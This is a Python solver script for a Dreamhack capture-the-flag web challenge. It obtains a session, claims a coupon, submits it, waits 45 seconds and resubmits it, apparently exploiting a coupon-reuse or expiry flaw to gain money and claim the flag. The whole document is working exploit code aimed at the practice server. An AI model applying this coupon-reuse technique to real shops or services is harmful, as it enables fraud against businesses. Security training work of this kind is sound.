import json
from time import sleep
import requests
import sys

class Solver:
    def __init__(self, port: str):
        self._URL = f"http://host3.dreamhack.games:{port}/"
        
    def _get_session(self):
        sessionRes = requests.get(f'{self._URL}/session')
        session = json.loads(sessionRes.text)["session"]
        print(f'[*]session : {session}')
            
        return session
    
    def _get_claimCoupon(self, session: str, sleepT: int = 45) -> str:
        header = {"Authorization": session}
        couponRes = requests.get(f'{self._URL}/coupon/claim', headers=header)
        header["coupon"] = json.loads(couponRes.text)["coupon"]
        res = json.loads(requests.get(f'{self._URL}/coupon/submit', headers=header).text)["status"]
        print(f'[*]status : {res}')
        
        sleep(sleepT)
        
        res = json.loads(requests.get(f'{self._URL}/coupon/submit', headers=header).text)["status"]
        print(f'[*]status : {res}')
        if "error" in res:
            return
        
        header = {"Authorization": session}
        
        res = json.loads(requests.get(f'{self._URL}/me', headers=header).text)['money']
        print(f'[*]money : {res}')
        
        return json.loads(requests.get(f'{self._URL}/flag/claim', headers=header).text)["message"]
        
    def solve(self):
        session = solver._get_session()
        flag = solver._get_claimCoupon(session)
        return flag
        
        
if __name__ == "__main__":
    port = sys.argv[1]
    
    while True:
        solver = Solver(port=port)
        flag = solver.solve()
        
        if not flag:
            continue
        print(f'[+]FLAG : {flag}')